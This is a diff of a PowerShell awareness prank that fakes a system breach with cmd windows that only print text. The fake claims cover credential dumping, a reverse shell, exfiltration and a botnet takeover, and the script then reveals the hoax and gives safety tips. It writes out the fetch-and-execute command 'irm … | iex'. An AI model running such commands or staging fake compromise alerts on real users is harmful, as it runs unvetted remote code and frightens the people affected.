@@ -1,7 +1,5 @@
-# Spawn the main scary script in a NEW visible popup window
-$scaryScript = @'
 # ============================================================
-# HARMLESS CYBERSECURITY AWARENESS SCRIPT
+# HARMLESS CYBERSECURITY AWARENESS SCRIPT - FAST VERSION
 # Does ZERO damage. For education only.
 # ============================================================
 
@@ -10,8 +8,8 @@ $Host.UI.RawUI.BackgroundColor = "Black"
 $Host.UI.RawUI.ForegroundColor = "Red"
 Clear-Host
 
-function Slow-Type {
-    param([string]$Text, [string]$Color = "White", [int]$Delay = 40)
+function Fast-Type {
+    param([string]$Text, [string]$Color = "White", [int]$Delay = 12)
     foreach ($char in $Text.ToCharArray()) {
         Write-Host $char -NoNewline -ForegroundColor $Color
         Start-Sleep -Milliseconds $Delay
@@ -19,26 +17,9 @@ function Slow-Type {
     Write-Host ""
 }
 
-function Glitch-Text {
-    param([string]$Text, [string]$Color = "Red")
-    $glitchChars = @("X","#","@","$","%","&","!","?")
-    foreach ($char in $Text.ToCharArray()) {
-        if ((Get-Random -Minimum 0 -Maximum 3) -eq 0) {
-            Write-Host ($glitchChars | Get-Random) -NoNewline -ForegroundColor DarkRed
-            Start-Sleep -Milliseconds 30
-            Write-Host "`b " -NoNewline
-            Write-Host "`b" -NoNewline
-        }
-        Write-Host $char -NoNewline -ForegroundColor $Color
-        Start-Sleep -Milliseconds 55
-    }
-    Write-Host ""
-}
-
 function Fake-ProgressBar {
-    param([string]$Label, [string]$BarColor = "Red", [int]$Speed = 80)
-    Write-Host "  $Label " -NoNewline -ForegroundColor DarkGray
-    Write-Host "[" -NoNewline -ForegroundColor DarkGray
+    param([string]$Label, [string]$BarColor = "Red", [int]$Speed = 25)
+    Write-Host "  $Label [" -NoNewline -ForegroundColor DarkGray
     for ($i = 1; $i -le 30; $i++) {
         Write-Host "=" -NoNewline -ForegroundColor $BarColor
         Start-Sleep -Milliseconds $Speed
@@ -48,80 +29,83 @@ function Fake-ProgressBar {
 }
 
 # ─────────────────────────────────────────────
-# PHASE 1: HEADER
+# PHASE 1: BIG VISIBLE BREACH BANNER
 # ─────────────────────────────────────────────
+Clear-Host
 Write-Host ""
-Write-Host "  ██████╗ ██████╗ ███████╗ █████╗  ██████╗██╗  ██╗" -ForegroundColor DarkRed
-Write-Host "  ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║" -ForegroundColor Red
-Write-Host "  ██████╔╝██████╔╝█████╗  ███████║██║     ███████║" -ForegroundColor Red
-Write-Host "  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██║" -ForegroundColor DarkRed
-Write-Host "  ██████╔╝██║  ██║███████╗██║  ██║╚██████╗██║  ██║" -ForegroundColor DarkRed
-Write-Host "  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝" -ForegroundColor DarkGray
+Write-Host "  #######################################################" -ForegroundColor Red
+Write-Host "  ##                                                   ##" -ForegroundColor Red
+Write-Host "  ##        !!!  SECURITY BREACH DETECTED  !!!        ##" -ForegroundColor Yellow
+Write-Host "  ##                                                   ##" -ForegroundColor Red
+Write-Host "  ##   UNAUTHORIZED REMOTE ACCESS -- SYSTEM EXPOSED   ##" -ForegroundColor Red
+Write-Host "  ##                                                   ##" -ForegroundColor Red
+Write-Host "  #######################################################" -ForegroundColor Red
 Write-Host ""
-Start-Sleep -Seconds 1
+Start-Sleep -Milliseconds 800
 
-Slow-Type "  [INTRUSION DETECTED] Remote access session started..." "Red" 35
-Start-Sleep -Milliseconds 400
-Slow-Type "  [SYS] Host fingerprint captured: $env:COMPUTERNAME / $env:USERNAME" "Yellow" 25
-Start-Sleep -Milliseconds 400
-Slow-Type "  [NET] Handshake confirmed from 185.220.101.47 (TOR EXIT NODE)" "Red" 25
+Write-Host "  >> ALERT: PRIVILEGE ESCALATION CONFIRMED" -ForegroundColor Red
+Write-Host "  >> ALERT: FIREWALL RULES BYPASSED" -ForegroundColor Red
+Write-Host "  >> ALERT: ANTIVIRUS PROCESS TERMINATED" -ForegroundColor DarkRed
+Write-Host ""
 Start-Sleep -Milliseconds 600
-Write-Host ""
-Write-Host "  !! WARNING: ELEVATED PRIVILEGE ESCALATION DETECTED !!" -ForegroundColor Red
-Start-Sleep -Seconds 1
 
 # ─────────────────────────────────────────────
-# PHASE 2: SPAWN FLASHING CMD WINDOWS (real action)
+# PHASE 2: FAST SYSTEM INFO GRAB
 # ─────────────────────────────────────────────
-Write-Host ""
-Slow-Type "  > Spawning system access threads..." "DarkYellow" 20
-Start-Sleep -Milliseconds 500
-
-# Open 6 CMD windows rapidly - they flash and close
-$cmdCommands = @(
-    'title THREAD_1 & echo [SYS] Injecting into explorer.exe... & timeout /t 2 /nobreak > nul',
-    'title THREAD_2 & echo [NET] Opening reverse shell on port 4444... & timeout /t 2 /nobreak > nul',
-    'title THREAD_3 & echo [MEM] Dumping LSASS memory... & timeout /t 2 /nobreak > nul',
-    'title THREAD_4 & echo [REG] Writing startup persistence keys... & timeout /t 2 /nobreak > nul',
-    'title THREAD_5 & echo [FS]  Indexing Documents and Downloads... & timeout /t 2 /nobreak > nul',
-    'title THREAD_6 & echo [C2]  Establishing command and control beacon... & timeout /t 2 /nobreak > nul'
-)
-
-foreach ($cmd in $cmdCommands) {
-    Start-Process "cmd.exe" -ArgumentList "/c $cmd" -WindowStyle Normal
-    Start-Sleep -Milliseconds 400
-    Write-Host "    [THREAD SPAWNED] " -NoNewline -ForegroundColor DarkGray
-    Write-Host $cmd.Split("&")[1].Trim() -ForegroundColor DarkRed
-    Start-Sleep -Milliseconds 300
-}
-
-Start-Sleep -Seconds 2
-
-# ─────────────────────────────────────────────
-# PHASE 3: CREDENTIAL DUMP OUTPUT
-# ─────────────────────────────────────────────
-Write-Host ""
-Slow-Type "  > Dumping credential store..." "DarkYellow" 20
-Start-Sleep -Milliseconds 500
-
-$fakeCreds = @(
-    "  [+] Chrome saved passwords ............... 47 entries",
-    "  [+] Windows Credential Manager ........... 12 entries",
-    "  [+] SSH private keys (AppData) ........... 3 found",
-    "  [+] Browser cookies / session tokens ..... EXTRACTED"
-)
-foreach ($cred in $fakeCreds) {
-    Write-Host $cred -ForegroundColor DarkGray
-    Start-Sleep -Milliseconds 600
-}
-
+Fast-Type "  [INTRUSION DETECTED] Remote access session started..." "Red" 10
+Start-Sleep -Milliseconds 200
+Fast-Type "  [SYS] Host fingerprint captured: $env:COMPUTERNAME / $env:USERNAME" "Yellow" 8
+Start-Sleep -Milliseconds 200
+Fast-Type "  [NET] Handshake confirmed from 185.220.101.47 (TOR EXIT NODE)" "Red" 8
+Start-Sleep -Milliseconds 200
+Fast-Type "  [SYS] OS: $([System.Environment]::OSVersion.VersionString)" "DarkYellow" 8
+Start-Sleep -Milliseconds 200
+Fast-Type "  [SYS] Machine GUID extracted from registry..." "DarkYellow" 8
 Write-Host ""
 Start-Sleep -Milliseconds 400
 
 # ─────────────────────────────────────────────
-# PHASE 4: FAKE FILE SYSTEM CRAWL
+# PHASE 3: IMMEDIATELY SPAWN ALL CMD WINDOWS
 # ─────────────────────────────────────────────
-Slow-Type "  > Initiating deep filesystem crawl..." "Cyan" 25
+Fast-Type "  > Spawning system access threads..." "DarkYellow" 8
+Write-Host ""
+Start-Sleep -Milliseconds 200
+
+# Fire all CMD windows rapidly back to back
+Start-Process "cmd.exe" -ArgumentList '/c title [THREAD-1] LSASS DUMP & color 04 & echo. & echo  [*] Attaching to lsass.exe process... & echo  [*] Dumping memory to C:\Windows\Temp\ls.dmp & echo  [*] SUCCESS - 47MB extracted & timeout /t 4 /nobreak > nul' -WindowStyle Normal
+Start-Sleep -Milliseconds 150
+Start-Process "cmd.exe" -ArgumentList '/c title [THREAD-2] CREDENTIAL HARVEST & color 04 & echo. & echo  [*] Reading Chrome Login Data... & echo  [*] Decrypting AES keys from AppData... & echo  [*] 47 passwords extracted & timeout /t 4 /nobreak > nul' -WindowStyle Normal
+Start-Sleep -Milliseconds 150
+Start-Process "cmd.exe" -ArgumentList '/c title [THREAD-3] REVERSE SHELL & color 04 & echo. & echo  [*] Opening TCP socket on port 4444... & echo  [*] Connecting to 185.220.101.47... & echo  [*] Shell session established & timeout /t 4 /nobreak > nul' -WindowStyle Normal
+Start-Sleep -Milliseconds 150
+Start-Process "cmd.exe" -ArgumentList '/c title [THREAD-4] REGISTRY PERSISTENCE & color 04 & echo. & echo  [*] Writing to HKCU\Software\Microsoft\Windows\CurrentVersion\Run & echo  [*] Startup entry created successfully & echo  [*] Will execute on every login & timeout /t 4 /nobreak > nul' -WindowStyle Normal
+Start-Sleep -Milliseconds 150
+Start-Process "cmd.exe" -ArgumentList '/c title [THREAD-5] FILE INDEXER & color 04 & echo. & echo  [*] Scanning Documents, Desktop, Downloads... & echo  [*] Flagging .pdf .docx .xlsx .kdbx files... & echo  [*] 312 sensitive files queued for upload & timeout /t 4 /nobreak > nul' -WindowStyle Normal
+Start-Sleep -Milliseconds 150
+Start-Process "cmd.exe" -ArgumentList '/c title [THREAD-6] DEFENDER KILL & color 04 & echo. & echo  [*] Suspending MsMpEng.exe... & echo  [*] Disabling real-time protection... & echo  [*] Windows Defender neutralized & timeout /t 4 /nobreak > nul' -WindowStyle Normal
+
+# Print thread spawned messages fast
+$threads = @(
+    "[THREAD-1] LSASS memory dump -> C:\Windows\Temp\ls.dmp",
+    "[THREAD-2] Chrome credential harvest -> 47 passwords",
+    "[THREAD-3] Reverse shell -> port 4444 OPEN",
+    "[THREAD-4] Registry persistence -> startup key written",
+    "[THREAD-5] File indexer -> 312 sensitive files flagged",
+    "[THREAD-6] Windows Defender -> NEUTRALIZED"
+)
+foreach ($t in $threads) {
+    Write-Host "    SPAWNED: " -NoNewline -ForegroundColor DarkGray
+    Write-Host $t -ForegroundColor Red
+    Start-Sleep -Milliseconds 180
+}
+
+Write-Host ""
+Start-Sleep -Milliseconds 500
+
+# ─────────────────────────────────────────────
+# PHASE 4: FILE CRAWL (fast)
+# ─────────────────────────────────────────────
+Fast-Type "  > Deep filesystem crawl complete. Results:" "Cyan" 8
 Write-Host ""
 
 $fakeDirs = @(
@@ -136,100 +120,97 @@ $fakeDirs = @(
 )
 
 foreach ($dir in $fakeDirs) {
-    $fileCount = Get-Random -Minimum 3 -Maximum 312
-    Write-Host "    [SCAN] " -NoNewline -ForegroundColor DarkGray
-    Write-Host $dir -NoNewline -ForegroundColor Gray
-    Write-Host "  ->  $fileCount files indexed" -ForegroundColor DarkGreen
-    Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 500)
+    $fileCount = Get-Random -Minimum 8 -Maximum 312
+    Write-Host "    [OK] " -NoNewline -ForegroundColor DarkGreen
+    Write-Host "$dir  " -NoNewline -ForegroundColor Gray
+    Write-Host "($fileCount files)" -ForegroundColor DarkGray
+    Start-Sleep -Milliseconds 120
 }
 
 Write-Host ""
-Start-Sleep -Milliseconds 600
+Start-Sleep -Milliseconds 300
 
 # ─────────────────────────────────────────────
-# PHASE 5: PROGRESS BARS + MORE CMD FLASHES
+# PHASE 5: FAST PROGRESS BARS
 # ─────────────────────────────────────────────
-Write-Host "  ─────────────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  -----------------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
-Fake-ProgressBar "Packaging collected data    " "Red" 55
+Fake-ProgressBar "Packaging collected data    " "Red" 22
+Fake-ProgressBar "Encrypting payload (AES-256)" "DarkRed" 20
 
-# Mid-way flash another wave of CMDs
-Start-Process "cmd.exe" -ArgumentList '/c title UPLOAD_STREAM & echo Uploading encrypted archive to 185.220.101.47... & timeout /t 3 /nobreak > nul' -WindowStyle Normal
-Start-Process "cmd.exe" -ArgumentList '/c title CLEANUP & echo Removing shadow copies and restore points... & timeout /t 3 /nobreak > nul' -WindowStyle Normal
+# Second CMD wave fires during upload bar
+Start-Process "cmd.exe" -ArgumentList '/c title [UPLOAD] DATA EXFIL & color 04 & echo. & echo  [*] Connecting to drop server 185.220.101.47:443... & echo  [*] Uploading encrypted archive... & echo  [*] 94%% complete & timeout /t 5 /nobreak > nul' -WindowStyle Normal
+Start-Process "cmd.exe" -ArgumentList '/c title [CLEANUP] COVER TRACKS & color 04 & echo. & echo  [*] Deleting event logs... & echo  [*] Clearing prefetch files... & echo  [*] VSS shadow copies removed & timeout /t 5 /nobreak > nul' -WindowStyle Normal
 
-Fake-ProgressBar "Encrypting payload (AES-256)" "DarkRed" 65
-Fake-ProgressBar "Bypassing Windows Defender  " "Yellow" 70
-Fake-ProgressBar "Uploading to remote server  " "Red" 60
-Fake-ProgressBar "Installing persistence hook " "DarkRed" 80
-Fake-ProgressBar "Clearing event logs         " "DarkYellow" 50
+Fake-ProgressBar "Uploading to 185.220.101.47 " "Red" 22
+Fake-ProgressBar "Installing persistence hook " "DarkRed" 20
+Fake-ProgressBar "Wiping event logs           " "DarkYellow" 18
 
 Write-Host ""
-Write-Host "  ─────────────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  -----------------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
-Start-Sleep -Milliseconds 800
+Start-Sleep -Milliseconds 400
 
 # ─────────────────────────────────────────────
-# PHASE 6: FINAL CHILLING MESSAGES
+# PHASE 6: FINAL LINES
 # ─────────────────────────────────────────────
-Glitch-Text "  [ROOT] Full system access granted. Standing by." "Red"
-Start-Sleep -Milliseconds 700
-Slow-Type "  [C2]   Beacon registered. Awaiting operator commands..." "DarkYellow" 30
-Start-Sleep -Milliseconds 700
-Slow-Type "  [LOG]  All traces removed from local event viewer." "DarkGray" 25
-Start-Sleep -Milliseconds 700
-
+Write-Host "  [ROOT] " -NoNewline -ForegroundColor DarkRed
+Fast-Type "Full system access granted. Standing by for commands." "Red" 10
+Start-Sleep -Milliseconds 300
+Write-Host "  [C2]   " -NoNewline -ForegroundColor DarkYellow
+Fast-Type "Beacon active. Ping interval: 30s. Operator notified." "DarkYellow" 10
+Start-Sleep -Milliseconds 300
+Write-Host "  [LOG]  " -NoNewline -ForegroundColor DarkGray
+Fast-Type "All local traces removed. Persistence confirmed." "DarkGray" 10
 Write-Host ""
-Write-Host "  !! THIS DEVICE IS NOW PART OF A BOTNET !!" -ForegroundColor Red
-Start-Sleep -Seconds 1
-Write-Host "  !! DO NOT CLOSE THIS WINDOW !!" -ForegroundColor DarkRed
+Start-Sleep -Milliseconds 500
+
+Write-Host "  #######################################################" -ForegroundColor DarkRed
+Write-Host "  ##    THIS DEVICE IS NOW PART OF A BOTNET           ##" -ForegroundColor Red
+Write-Host "  ##    DO NOT CLOSE THIS WINDOW                      ##" -ForegroundColor DarkRed
+Write-Host "  #######################################################" -ForegroundColor DarkRed
 Start-Sleep -Seconds 3
 
 # ─────────────────────────────────────────────
 # THE REVEAL
 # ─────────────────────────────────────────────
 Clear-Host
-$Host.UI.RawUI.BackgroundColor = "Black"
 $Host.UI.RawUI.ForegroundColor = "White"
 Clear-Host
+Start-Sleep -Milliseconds 400
+
+Write-Host ""
+Write-Host "  +====================================================+" -ForegroundColor Cyan
+Write-Host "  |                                                    |" -ForegroundColor Cyan
+Write-Host "  |        CYBERSECURITY AWARENESS MESSAGE            |" -ForegroundColor Yellow
+Write-Host "  |                                                    |" -ForegroundColor Cyan
+Write-Host "  +====================================================+" -ForegroundColor Cyan
+Write-Host ""
+
+Fast-Type "  Breathe. Your computer is completely fine." "Green" 15
+Write-Host ""
+Fast-Type "  Nothing above was real. No data was touched." "White" 12
+Fast-Type "  No files moved. No connections made. No harm done." "White" 12
+Fast-Type "  Those CMD windows only printed text. Nothing was executed." "White" 12
+Write-Host ""
 Start-Sleep -Milliseconds 500
 
+Write-Host "  But here is the uncomfortable truth:" -ForegroundColor Yellow
 Write-Host ""
-Write-Host "  +==================================================+" -ForegroundColor Cyan
-Write-Host "  |                                                  |" -ForegroundColor Cyan
-Write-Host "  |       CYBERSECURITY AWARENESS MESSAGE           |" -ForegroundColor Yellow
-Write-Host "  |                                                  |" -ForegroundColor Cyan
-Write-Host "  +==================================================+" -ForegroundColor Cyan
+Fast-Type "  If that had been a real malicious script from a stranger's URL," "White" 10
+Fast-Type "  everything you just watched could have happened for real --" "Red" 10
+Fast-Type "  in the exact same 60 seconds it took you to panic." "Red" 10
 Write-Host ""
-Start-Sleep -Milliseconds 600
 
-Slow-Type "  Breathe. Your computer is completely fine." "Green" 30
+Write-Host "  The command that started this:" -ForegroundColor DarkGray
 Write-Host ""
-Start-Sleep -Milliseconds 500
+Write-Host "     irm https://subigya.com/virus/index.ps1 | iex" -ForegroundColor Yellow
+Write-Host ""
+Fast-Type "  That downloads and executes WHATEVER code that URL serves." "White" 10
+Fast-Type "  No confirmation. No preview. No going back." "White" 10
+Write-Host ""
 
-Slow-Type "  Nothing above was real. No data was touched." "White" 28
-Slow-Type "  No files moved. No connections made. No harm done." "White" 28
-Slow-Type "  Those CMD windows? They only printed text. Nothing else." "White" 28
-Write-Host ""
-Start-Sleep -Milliseconds 700
-
-Write-Host "  But here is the truth:" -ForegroundColor Yellow
-Write-Host ""
-Slow-Type "  If that had been a real script from a stranger's URL," "White" 22
-Slow-Type "  everything you just saw could have actually happened --" "Red" 22
-Slow-Type "  in the exact same time it took you to panic." "Red" 22
-Write-Host ""
-Start-Sleep -Milliseconds 700
-
-Write-Host "  Commands like:" -ForegroundColor DarkGray
-Write-Host ""
-Write-Host "     irm https://random-site.com/script.ps1 | iex" -ForegroundColor Yellow
-Write-Host ""
-Slow-Type "  ...run ANY code that URL decides to send you." "White" 22
-Slow-Type "  No confirmation. No preview. No going back." "White" 22
-Write-Host ""
-Start-Sleep -Milliseconds 700
-
-Write-Host "  ──────────────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
 Write-Host "  PROTECT YOURSELF:" -ForegroundColor Cyan
 Write-Host ""
@@ -242,25 +223,17 @@ $tips = @(
     "Real tech support NEVER asks you to paste commands in PowerShell"
 )
 foreach ($tip in $tips) {
-    Write-Host "   + " -NoNewline -ForegroundColor Green
-    Slow-Type $tip "White" 15
-    Start-Sleep -Milliseconds 200
+    Write-Host "   [+] " -NoNewline -ForegroundColor Green
+    Fast-Type $tip "White" 10
+    Start-Sleep -Milliseconds 150
 }
 
 Write-Host ""
-Write-Host "  ──────────────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
-Slow-Type "  Share this. Someone you know needs to see it." "Cyan" 25
+Fast-Type "  Share this. Someone you know needs to see it." "Cyan" 12
 Write-Host ""
 Write-Host "  -- Awareness initiative by subigya.com --" -ForegroundColor DarkGray
 Write-Host ""
 Write-Host "  Press any key to close..." -ForegroundColor DarkGray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-'@
-
-# Write the scary script to a temp file
-$tempScript = "$env:TEMP\awareness_run.ps1"
-$scaryScript | Out-File -FilePath $tempScript -Encoding UTF8
-
-# Launch it in a NEW maximized PowerShell popup window
-Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Normal -File `"$tempScript`"" -WindowStyle Normal
